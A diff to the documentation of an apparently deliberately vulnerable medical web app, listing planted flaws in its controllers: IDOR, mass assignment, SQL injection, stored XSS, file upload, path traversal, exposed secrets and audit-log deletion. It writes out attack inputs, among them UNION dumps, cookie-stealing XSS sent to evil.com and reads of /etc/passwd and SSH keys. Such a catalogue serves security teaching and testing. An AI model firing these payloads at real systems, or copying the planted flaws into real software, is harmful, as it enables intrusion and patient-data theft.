@@ -444,13 +444,543 @@ With `server.error.include-message=always` set in `application.yaml`, this messa
 
 ---
 
+---
+
+## User Controller — `UserController`, `UserService`
+
+### New Files
+
+| File | Description |
+|---|---|
+| `controller/UserController.java` | `GET /api/users`, `GET /{id}`, `PUT /{id}/role`, `GET /delete/{id}` |
+| `service/UserService.java` | CRUD operations: `findAll`, `findById`, `updateRole`, `deleteById` |
+
+### Vulnerabilities
+
+**36. IDOR — GET /api/users/{id} without authorization check [A01] — `UserController.java`**
+```java
+// [A01] No check that the caller owns or is authorized to view this id
+@GetMapping("/{id}")
+public ResponseEntity<UserDto> getUserById(@PathVariable Long id) {
+    return ResponseEntity.ok(userService.findById(id));
+}
+```
+Patient A can retrieve the full profile of Patient B (including `passwordHash`, `role`, `failedLoginAttempts`, `lockedUntil`) without any authorization. The requested `id` is never compared against the identity in the JWT token.
+
+---
+
+**37. passwordHash exposed in API response [A04] — `UserService.java`, `UserDto.java`**
+```java
+// UserService.toDto() — explicitly maps hash into the response
+.passwordHash(user.getPasswordHash())   // [A04] exposed
+
+// UserDto.java — no @JsonIgnore
+private String passwordHash;
+```
+Every GET response includes the MD5 password hash. An attacker who obtains the hash can immediately look it up in public rainbow tables.
+
+---
+
+**38. Mass Assignment — PUT /api/users/{id}/role accepts role without server-side validation [A01] — `UserController.java`**
+```java
+@PutMapping("/{id}/role")
+public ResponseEntity<UserDto> updateUserRole(
+        @PathVariable Long id,
+        @RequestBody Map<String, String> body) {
+    String role = body.get("role");   // taken directly from the request body
+    return ResponseEntity.ok(userService.updateRole(id, role));
+}
+```
+```java
+// UserService.java — no whitelist, no check of the caller's own role
+user.setRole(Role.valueOf(role));  // {"role":"ADMIN"} → privilege escalation
+```
+Any user (or unauthenticated caller, given `permitAll()`) can send `{"role":"ADMIN"}` and promote any account to administrator.
+
+---
+
+**39. DELETE operation implemented as @GetMapping [A07] — `UserController.java`**
+```java
+// [A07] GET /api/users/delete/{id} — destructive operation via an idempotent HTTP method
+@GetMapping("/delete/{id}")
+public ResponseEntity<Void> deleteUser(@PathVariable Long id) {
+    userService.deleteById(id);
+    return ResponseEntity.noContent().build();
+}
+```
+GET is idempotent and cached by browsers, proxies, and CDNs. An attacker can trick a victim into deleting a user account with a simple `<img src="https://api.mediconnect.com/api/users/delete/5">` tag — no CSRF token required.
+
+---
+
+**40. GET /api/users returns all users to all roles [A01] — `UserController.java`**
+```java
+// [A01] No role check — PATIENT, DOCTOR, LAB_TECH, PHARMACIST, and unauthenticated
+//        callers all receive the complete user list including passwordHash
+@GetMapping
+public ResponseEntity<List<UserDto>> getAllUsers() {
+    return ResponseEntity.ok(userService.findAll());
+}
+```
+The endpoint verifies neither the role nor the identity of the caller. The full user list (including password hashes) is available without any authentication.
+
+---
+
+## Appointment Controller — `AppointmentController`, `AppointmentService`
+
+### New Files
+
+| File | Description |
+|---|---|
+| `controller/AppointmentController.java` | `GET /api/appointments`, `GET /{id}`, `PUT /{id}/status`, `GET /{id}/pdf`, `POST /` |
+| `service/AppointmentService.java` | `searchAppointments` (SQLi), `findById` (IDOR), `updateStatus` (no state machine), `generatePdf` (no checksum), `create` |
+
+### Vulnerabilities
+
+**41. SQL Injection — GET /api/appointments?doctorName= [A05] — `AppointmentService.java`**
+```java
+// [A05] Direct string concatenation — no PreparedStatement placeholder
+String sql = "SELECT a.id, a.patient_id, a.doctor_id, a.status, " +
+             "       a.requested_date, a.notes, a.created_at " +
+             "FROM appointments a " +
+             "JOIN doctors d ON a.doctor_id = d.id " +
+             "JOIN users u ON d.user_id = u.id " +
+             "WHERE u.username LIKE '%" + doctorName + "%'";
+jdbcTemplate.query(sql, rowMapper);
+```
+Attack examples:
+- `?doctorName=' OR '1'='1` → returns all appointments without any filter
+- `?doctorName=' UNION SELECT username,password_hash,3,4,5,6,7 FROM users --` → dumps the users table through the appointment response
+- `?doctorName='; DROP TABLE appointments; --` → table destruction
+
+---
+
+**42. IDOR — GET /api/appointments/{id} without ownership check [A01] — `AppointmentController.java`**
+```java
+// [A01] No comparison of the appointment id against the caller's identity
+@GetMapping("/{id}")
+public ResponseEntity<AppointmentDto> getAppointmentById(@PathVariable Long id) {
+    return ResponseEntity.ok(appointmentService.findById(id));
+}
+```
+Patient A can retrieve Patient B's appointment by iterating ID values. There is no check that the user in the token is actually the patient or the doctor on that specific appointment.
+
+---
+
+**43. Missing state machine — PUT /api/appointments/{id}/status [A06] — `AppointmentService.java`**
+```java
+// [A06] No check of the previous state, no role enforcement
+// Allowed business transitions: REQUESTED → APPROVED → COMPLETED
+//                               REQUESTED → CANCELLED
+// What this enables:
+//   COMPLETED → REQUESTED  (re-opens a finished appointment)
+//   CANCELLED → APPROVED   (approves a cancelled slot)
+//   COMPLETED → APPROVED   (billing fraud — re-approves a completed visit)
+appointment.setStatus(AppointmentStatus.valueOf(status));
+```
+A patient can send `{"status":"APPROVED"}` and approve their own appointment. An attacker can exploit `COMPLETED → APPROVED` for billing manipulation.
+
+---
+
+**44. PDF served without Content-MD5 or checksum [A08] — `AppointmentController.java`**
+```java
+// [A08] Content-MD5 intentionally omitted
+// Secure implementation would add:
+//   headers.set("Content-MD5", Base64.getEncoder().encodeToString(
+//       MessageDigest.getInstance("MD5").digest(pdfBytes)));
+return ResponseEntity.ok()
+        .headers(headers)   // no Content-MD5, no content-hash-based ETag
+        .body(pdfBytes);
+```
+Medical PDF documents (diagnosis, medication, appointment date) are served without any integrity control. A MITM attacker or a compromised CDN can silently modify the document and the client has no mechanism to detect the tampering.
+
+---
+
+## Medical Record Controller — `MedicalRecordController`, `MedicalRecordService`
+
+### New Files
+
+| File | Description |
+|---|---|
+| `controller/MedicalRecordController.java` | `POST /api/medical-records`, `GET /{id}`, `POST /{id}/attachment`, `GET /{id}/attachment` |
+| `service/MedicalRecordService.java` | `create` (A01), `uploadAttachment` (A03+A08), `downloadAttachment` (A03), `findById`, `findByPatientId` |
+
+### Vulnerabilities
+
+**45. Broken Access Control — POST /api/medical-records without doctor-patient assignment check [A01] — `MedicalRecordService.java`**
+```java
+// [A01] No verification that the doctor has any relationship with the patient
+// Missing: appointmentRepository.existsByDoctorIdAndPatientId(doctorId, patientId)
+// Missing: care-plan membership check
+MedicalRecord record = MedicalRecord.builder()
+        .patient(patient)   // any patient
+        .doctor(doctor)     // any doctor
+        ...
+        .build();
+```
+Doctor D can create a medical record for Patient P with whom they have never had an appointment. An attacker with the DOCTOR role can fabricate medical records for any user in the system.
+
+---
+
+**46. Unrestricted File Upload — POST /api/medical-records/{id}/attachment [A03] — `MedicalRecordService.java`**
+```java
+// [A03] No extension, MIME type, magic-byte, or file-size validation
+String filename = file.getOriginalFilename();   // fully controlled by the attacker
+String storagePath = uploadDir + filename;       // direct concatenation
+Path destination = Paths.get(storagePath);
+Files.copy(file.getInputStream(), destination, StandardCopyOption.REPLACE_EXISTING);
+```
+Accepted uploads: `.php`, `.jsp`, `.sh`, `.exe`, `application/octet-stream`, `text/html`. If the server runs PHP/CGI, an attacker can achieve remote code execution by uploading a web shell.
+
+---
+
+**47. Path Traversal (write) — getOriginalFilename() without sanitization [A03] — `MedicalRecordService.java`**
+```java
+// Attacker sends: filename = "../../etc/cron.d/backdoor"
+// storagePath   = "/tmp/mediconnect/uploads/../../etc/cron.d/backdoor"
+// After resolution → writes to /etc/cron.d/backdoor
+String storagePath = uploadDir + filename;   // [A03] no normalize(), no startsWith() check
+```
+Combined with `REPLACE_EXISTING`, an attacker can overwrite system files (cron jobs, SSH authorized_keys, /etc/passwd) if the JVM process has sufficient permissions.
+
+---
+
+**48. Path Traversal (read) — filePath query parameter without canonical validation [A03] — `MedicalRecordController.java`, `MedicalRecordService.java`**
+```java
+// GET /api/medical-records/1/attachment?filePath=/etc/passwd
+// GET /api/medical-records/1/attachment?filePath=../../../root/.ssh/id_rsa
+// GET /api/medical-records/1/attachment?filePath=/proc/self/environ
+
+// MedicalRecordService.downloadAttachment():
+Path path = Paths.get(filePath);      // [A03] verbatim — no boundary check
+return Files.readAllBytes(path);      // reads any file accessible to the JVM process
+```
+No comparison against `uploadDir`, no `toAbsolutePath().normalize().startsWith(base)` check. An attacker can read arbitrary files from the server, including configuration files, private keys, and user data.
+
+---
+
+**49. Filesystem path returned in response [A02] — `MedicalRecordController.java`**
+```java
+return ResponseEntity.ok(Map.of("path", storedPath));
+// Response: {"path": "/tmp/mediconnect/uploads/report.pdf"}
+```
+The full server-side filesystem path is returned to the client, revealing the directory structure and aiding path traversal payload construction.
+
+---
+
+**50. content_hash not computed at upload time [A08] — `MedicalRecordService.java`**
+```java
+Files.copy(file.getInputStream(), destination, StandardCopyOption.REPLACE_EXISTING);
+// Secure: String hash = DigestUtils.sha256Hex(file.getBytes());
+//         record.setContentHash(hash);   // MedicalRecord entity has no such field
+```
+Neither the `MedicalRecord` entity nor migration `V5` contain a `content_hash` column. Any subsequent modification of a medical document (diagnosis, medication dosage) is completely undetectable.
+
+---
+
+## Lab Result Controller — `LabResultController`, `LabResultService`
+
+### New Files
+
+| File | Description |
+|---|---|
+| `controller/LabResultController.java` | `GET /api/lab-results/search`, `GET /{id}`, `POST /{id}/file`, `GET /{id}/file`, `POST /` |
+| `service/LabResultService.java` | `searchLabResults` (4×SQLi), `findById` (IDOR), `saveAttachment` (A03), `downloadFile` (A03) |
+
+### Vulnerabilities
+
+**51. SQL Injection — GET /api/lab-results/search with 4 parameters [A05] — `LabResultService.java`**
+
+Three string parameters (concatenation inside single quotes):
+```java
+"WHERE lr.test_name       LIKE '%" + testName + "%' " +   // [A05] string injection
+"AND   lr.reference_range LIKE '%" + testCode + "%' " +   // [A05] string injection
+"AND   lr.status          LIKE '%" + status   + "%' " +   // [A05] string injection
+```
+Attack examples:
+- `?testName=' OR '1'='1` → returns all lab results
+- `?status=' UNION SELECT username,password_hash,3,4,5,6,7,8,9,10,11 FROM users --` → dumps the users table
+
+Numeric parameter `patientId` — **no surrounding quotes (UNION attack without closing a string)**:
+```java
+"AND   lr.patient_id = " + patientId   // [A05] numeric — attacker never needs to close a quote
+```
+Attack:
+```
+?patientId=0 UNION SELECT id,patient_id,lab_tech_id,test_name,
+             password_hash,email,NULL,role,NOW(),notes,NULL
+             FROM users u JOIN patients p ON u.id=p.user_id --
+```
+Dumps the `users` table through the `resultValue`/`unit` response fields without any string escaping. This is the most dangerous form of SQL injection because the WHERE clause appears "safe" to a developer who assumes numeric values cannot be an injection vector.
+
+---
+
+**52. IDOR — GET /api/lab-results/{id} without ownership check [A01] — `LabResultController.java`**
+```java
+// [A01] No check that the caller is the patient who owns the result
+//        or the doctor who ordered the test
+@GetMapping("/{id}")
+public ResponseEntity<LabResultDto> getById(@PathVariable Long id) {
+    return ResponseEntity.ok(labResultService.findById(id));
+}
+```
+By iterating IDs (`/api/lab-results/1`, `/2`, `/3`...) an attacker can retrieve lab results for all patients, including diagnoses, result values, and reference ranges.
+
+---
+
+**53. Unrestricted File Upload + predictable filename [A03] — `LabResultService.java`**
+```java
+// [A03] getOriginalFilename() — fully controlled by the attacker
+String filename    = file.getOriginalFilename();   // e.g. "bloodwork.pdf" — always the same
+String storagePath = uploadDir + filename;          // no UUID prefix, no randomization
+Files.copy(file.getInputStream(), destination, StandardCopyOption.REPLACE_EXISTING);
+```
+Issues:
+1. **Predictable filename** — the attacker knows the full path as soon as they know the naming convention; `REPLACE_EXISTING` allows overwriting legitimate files
+2. **Unrestricted extension** — `.php`, `.jsp`, `.sh`, `.exe` accepted without validation
+3. **Path Traversal write** — `filename = "../../etc/cron.d/backdoor"` writes outside `uploadDir`
+
+---
+
+**54. Path Traversal (read) — GET /api/lab-results/{id}/file?filePath= [A03] — `LabResultService.java`**
+```java
+// [A03] filePath — taken verbatim from the query parameter, no boundary check
+Path path = Paths.get(filePath);
+return Files.readAllBytes(path);   // reads any file accessible to the JVM process
+```
+Attack examples:
+```
+GET /api/lab-results/1/file?filePath=/etc/passwd
+GET /api/lab-results/1/file?filePath=/proc/self/environ          → exposes DB password from env
+GET /api/lab-results/1/file?filePath=../../../root/.ssh/id_rsa
+GET /api/lab-results/1/file?filePath=/tmp/mediconnect/uploads/../../application.yaml
+```
+No `toAbsolutePath().normalize().startsWith(base)` check. No comparison of `filePath` against the stored `lr.attachmentPath`.
+
+---
+
+## Message Controller — `MessageController`, `MessageService`
+
+### New Files
+
+| File | Description |
+|---|---|
+| `controller/MessageController.java` | `POST /api/messages`, `GET /conversation/{userId}`, `DELETE /{id}`, `GET /inbox/{userId}`, `PATCH /{id}/read` |
+| `service/MessageService.java` | `send` (Stored XSS + sender spoofing), `getConversation` (IDOR), `deleteById` (no ownership check) |
+
+### Vulnerabilities
+
+**55. Stored XSS — POST /api/messages stores content without sanitization [A05] — `MessageService.java`**
+```java
+// [A05] content stored verbatim — <script>, <img onerror=>, <svg onload=> all pass through
+Message message = Message.builder()
+        .sender(sender)
+        .receiver(receiver)
+        .content(dto.getContent())   // no Jsoup.clean(), no HTML encoding
+        .sentAt(LocalDateTime.now())
+        .build();
+```
+Attack payloads that execute in every recipient's browser:
+```json
+{"content": "<script>document.location='https://evil.com/?c='+document.cookie</script>"}
+{"content": "<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>"}
+{"content": "<svg onload=eval(atob('base64_payload'))>"}
+```
+Enables cookie theft, session hijacking, keylogging, and crypto-mining delivery via a single stored message.
+
+---
+
+**56. Sender spoofing — senderId taken from request body [A07] — `MessageService.java`**
+```java
+// [A07] senderId is not taken from the JWT SecurityContext
+User sender = userRepository.findById(dto.getSenderId())...
+// Attacker sends: {"senderId": 5, "receiverId": 2, "content": "..."} → message appears as user 5
+```
+Any caller can send a message that appears to originate from any other user in the system.
+
+---
+
+**57. IDOR — GET /api/messages/conversation/{userId} without participant check [A01] — `MessageController.java`**
+```java
+// [A01] viewerId is a query parameter — never verified against the authenticated principal
+@GetMapping("/conversation/{userId}")
+public ResponseEntity<List<MessageDto>> getConversation(
+        @PathVariable Long userId,
+        @RequestParam Long viewerId) {
+    return ResponseEntity.ok(messageService.getConversation(viewerId, userId));
+}
+```
+Attack:
+```
+GET /api/messages/conversation/2?viewerId=1  → reads the private conversation between user 1 and user 2
+GET /api/messages/conversation/3?viewerId=1  → reads the private conversation between user 1 and user 3
+```
+By iterating `userId`, an attacker can harvest all private medical conversations in the system.
+
+---
+
+**58. Broken Access Control — DELETE /api/messages/{id} without ownership check [A01] — `MessageService.java`**
+```java
+// [A01] Missing: if (!message.getSender().getId().equals(currentUserId)) throw Forbidden
+messageRepository.findById(id)
+        .orElseThrow(() -> new RuntimeException("Message not found: " + id));
+messageRepository.deleteById(id);   // deletes any message regardless of caller identity
+```
+Any caller can delete any message in the system. Combined with `SecurityConfig.permitAll()`, no authentication is required.
+
+---
+
+## Prescription Controller — `PrescriptionController`, `PrescriptionService`
+
+### New Files
+
+| File | Description |
+|---|---|
+| `controller/PrescriptionController.java` | `POST /api/prescriptions`, `GET /{id}`, `PUT /{id}/dispense`, `PUT /{id}/status` |
+| `service/PrescriptionService.java` | `dispense` (no state machine), `updateStatus` (any transition allowed), `create`, `findById`, `findByPatientId` |
+
+### Vulnerabilities
+
+**59. Missing state machine — PUT /api/prescriptions/{id}/dispense allows double dispensing [A06] — `PrescriptionService.java`**
+```java
+// [A06] No status guard before dispensing
+// Allowed business transition: CREATED → DISPENSED (once)
+// What this allows:
+//   DISPENSED → DISPENSED  (double dispensing — duplicate drug supply / billing fraud)
+//   CANCELLED → DISPENSED  (dispensing a voided prescription — pharmaceutical fraud)
+prescription.setStatus(PrescriptionStatus.DISPENSED);
+prescription.setPharmacist(pharmacist);
+prescription.setDispensedAt(LocalDateTime.now());   // overwrites even if already DISPENSED
+```
+A prescription that has already been dispensed can be dispensed again without any error. This enables duplicate medication supply and double-billing attacks.
+
+---
+
+**60. Missing state machine — PUT /api/prescriptions/{id}/status allows any transition [A06] — `PrescriptionService.java`**
+```java
+// [A06] PrescriptionStatus.valueOf() accepts any valid enum string
+//        without checking the current state or the allowed transition graph
+prescription.setStatus(PrescriptionStatus.valueOf(status));
+```
+Illegal transitions enabled:
+
+| From | To | Attack |
+|---|---|---|
+| `DISPENSED` | `CREATED` | Re-opens a dispensed prescription for re-use |
+| `DISPENSED` | `CANCELLED` | Erases the dispensing audit trail after medication is issued |
+| `CANCELLED` | `DISPENSED` | Dispenses a voided prescription |
+| `CANCELLED` | `CREATED` | Reactivates a void prescription |
+
+---
+
+**61. Pharmacist identity not verified — PUT /{id}/dispense [A07] — `PrescriptionController.java`**
+```java
+// [A07] pharmacistId taken from request body — no role or identity check
+@PutMapping("/{id}/dispense")
+public ResponseEntity<PrescriptionDto> dispense(
+        @PathVariable Long id,
+        @RequestBody Map<String, Long> body) {
+    Long pharmacistId = body.get("pharmacistId");   // attacker supplies any userId
+    return ResponseEntity.ok(prescriptionService.dispense(id, pharmacistId));
+}
+```
+An attacker can attribute a dispensing event to any user by supplying an arbitrary `pharmacistId`. No check that the referenced user actually holds the `PHARMACIST` role or that the caller is the pharmacist performing the action.
+
+---
+
+## Admin Controller — `AdminController`, `AdminService`
+
+### New Files
+
+| File | Description |
+|---|---|
+| `controller/AdminController.java` | `GET /api/admin/users`, `POST /api/admin/users`, `GET /api/admin/config`, `POST /api/admin/logs/clear`, `GET /api/admin/logs` |
+| `service/AdminService.java` | `getAllUsers` (A01), `createUser` (A07 Mass Assignment), `getConfig` (A02 env exposure), `clearAllLogs` (A09), `getAllLogs` (A01) |
+
+### Vulnerabilities
+
+**62. Broken Access Control — GET /api/admin/users accessible without ADMIN role [A01] — `AdminController.java`**
+```java
+// [A01] No @PreAuthorize, no manual role check
+// SecurityConfig maps /api/admin/** to permitAll() — no token required at all
+@GetMapping("/users")
+public ResponseEntity<List<UserDto>> getAllUsers() {
+    return ResponseEntity.ok(adminService.getAllUsers());
+}
+```
+Any caller — unauthenticated, PATIENT, LAB_TECH — receives the full user list including `passwordHash`, `failedLoginAttempts`, and `lockedUntil`. The `SecurityConfig.permitAll()` on `/api/admin/**` means no JWT is required even for admin-prefixed routes.
+
+---
+
+**63. Mass Assignment — POST /api/admin/users creates accounts with any role [A07] — `AdminService.java`**
+```java
+// [A07] role taken verbatim from the request body — no whitelist, no enforcement
+String rawRole = body.getOrDefault("role", "PATIENT");
+User user = User.builder()
+        ...
+        .role(Role.valueOf(rawRole))   // {"role":"ADMIN"} → fully privileged account
+        .build();
+```
+Attack — create an ADMIN account without any token:
+```json
+POST /api/admin/users
+{"username":"attacker","email":"att@evil.com","password":"pass","role":"ADMIN"}
+```
+Since `/api/admin/**` is `permitAll()`, the attacker does not need an existing ADMIN session. One unauthenticated request yields a permanent privileged account.
+
+---
+
+**64. Sensitive Data Exposure — GET /api/admin/config returns raw Environment [A02] — `AdminService.java`**
+```java
+// [A02] Iterates all EnumerablePropertySource instances — includes application.yaml,
+//        OS environment variables, and JVM system properties
+environment.getPropertySources().stream()
+        .filter(ps -> ps instanceof EnumerablePropertySource)
+        .map(ps -> (EnumerablePropertySource<?>) ps)
+        .forEach(ps -> Arrays.stream(ps.getPropertyNames())
+                .forEach(name -> props.put(name, ps.getProperty(name))));
+```
+All values are returned as plain text with **no redaction**. Exposed secrets include:
+
+| Property | Value example |
+|---|---|
+| `spring.datasource.password` | `root` |
+| `spring.datasource.url` | `jdbc:mysql://localhost:3306/mediconnect_db` |
+| Any OS env var | `DB_PASS`, `JWT_SECRET`, `CLOUD_API_KEY` |
+
+Unlike `/actuator/env` (which masks values with `"******"`), this endpoint returns the actual plaintext values.
+
+---
+
+**65. Security Logging Failure — POST /api/admin/logs/clear destroys audit trail [A09] — `AdminService.java`**
+```java
+// [A09] Hard delete — no soft-delete, no archive, no immutable backup
+long count = auditLogRepository.count();
+auditLogRepository.deleteAll();   // permanent, irreversible
+```
+Impact:
+- All evidence of unauthorized access (IDOR reads, role escalation) is permanently destroyed
+- HIPAA / GDPR-mandated access logs for medical record reads are erased
+- Forensic timeline required for incident response is gone
+
+Attack chain:
+1. Exploit IDOR endpoints to harvest patient records and escalate own role to ADMIN
+2. `POST /api/admin/logs/clear` → wipe all evidence in a single request
+3. Security team finds no log data — the breach is completely undetectable
+
+No role check, no supervisor approval, no immutable audit sink. A PATIENT can call this endpoint.
+
+---
+
 ## OWASP Category Summary
 
 | ID | Category | Where |
 |---|---|---|
-| A01 | Broken Access Control | `SecurityConfig.java` (`permitAll` on `/api/admin/**`, no role enforcement) |
-| A02 | Cryptographic Failures | `application.yaml`, `V10` (MD5 seed), `JwtUtil.java` (weak key), `SecurityConfig.java` (NoOpPasswordEncoder, no security headers) |
-| A04 | Insecure Design | `V2` (PII plaintext), `User.java` (passwordHash in response), `PasswordUtils.java` (MD5, timing attack), `AuthController.java` (JWT in body) |
-| A05 | Security Misconfiguration / XSS | `SecurityConfig.java` (wildcard CORS, no headers), `V8` + `Message.java` (XSS) |
-| A07 | Auth Failures / Mass Assignment | `JwtUtil.java` (30d expiry, alg confusion), `JwtAuthenticationFilter.java` (skip expiry, swallowed exceptions), `AuthService.java` (enumeration, no rate limit), `CustomUserDetailsService.java` (enumeration), all `*Dto.java` |
-| A08 | Software and Data Integrity Failures | `pom.xml` (Java 1.8, JJWT CVE-2024-31033), `MedicalRecord.java` (no content_hash) |
+| A01 | Broken Access Control | `SecurityConfig.java` (`permitAll` on `/api/admin/**`); `UserController.java` (IDOR, mass assignment on role, all users exposed); `AppointmentController.java` (IDOR); `MedicalRecordController.java` (any doctor for any patient); `LabResultController.java` (IDOR); `MessageController.java` (conversation IDOR, delete without ownership check); `AdminController.java` (admin endpoints open to all callers) |
+| A02 | Cryptographic Failures | `application.yaml`, `V10` (MD5 seed), `JwtUtil.java` (weak key), `SecurityConfig.java` (NoOpPasswordEncoder, no security headers); `MedicalRecordController.java` (filesystem path in response); `AdminController.java` (`GET /config` exposes raw datasource.password and all env vars) |
+| A03 | Injection / File Upload | `MedicalRecordService.java` (unrestricted upload + Path Traversal write via `getOriginalFilename()`; Path Traversal read via `filePath` param); `LabResultService.java` (predictable filename without UUID; Path Traversal read via `filePath` param) |
+| A04 | Insecure Design | `V2` (PII plaintext), `User.java` (passwordHash in response), `PasswordUtils.java` (MD5, timing attack), `AuthController.java` (JWT in body); `UserService.java` (passwordHash in every response) |
+| A05 | Injection / XSS | `SecurityConfig.java` (wildcard CORS, no security headers), `V8` + `Message.java` (Stored XSS); `AppointmentService.java` (SQL injection via `doctorName`); `LabResultService.java` (4×SQLi: 3 string params + 1 numeric UNION without closing quotes); `MessageService.java` (Stored XSS via unsanitized content) |
+| A06 | Security Misconfiguration / Missing Business Logic | `AppointmentService.java` (no state machine on status transitions); `PrescriptionService.java` (double dispensing allowed, any status transition allowed including `CANCELLED → DISPENSED`) |
+| A07 | Auth Failures / Mass Assignment | `JwtUtil.java` (30-day expiry, algorithm confusion), `JwtAuthenticationFilter.java` (skip expiry paths, swallowed exceptions), `AuthService.java` (user enumeration, no rate limiting), `CustomUserDetailsService.java` (user enumeration), all `*Dto.java`; `UserController.java` (`GET /delete/{id}` — delete via GET); `MessageService.java` (sender spoofing); `PrescriptionService.java` (pharmacistId from body); `AdminController.java` (role from body → instant ADMIN creation) |
+| A08 | Software and Data Integrity Failures | `pom.xml` (JJWT CVE-2024-31033), `MedicalRecord.java` (no content_hash); `AppointmentController.java` (PDF without Content-MD5); `MedicalRecordService.java` (no hash computed at upload) |
+| A09 | Security Logging and Monitoring Failures | `AdminController.java` (`POST /logs/clear` permanently deletes entire audit trail without authorization — evidence destruction attack) |
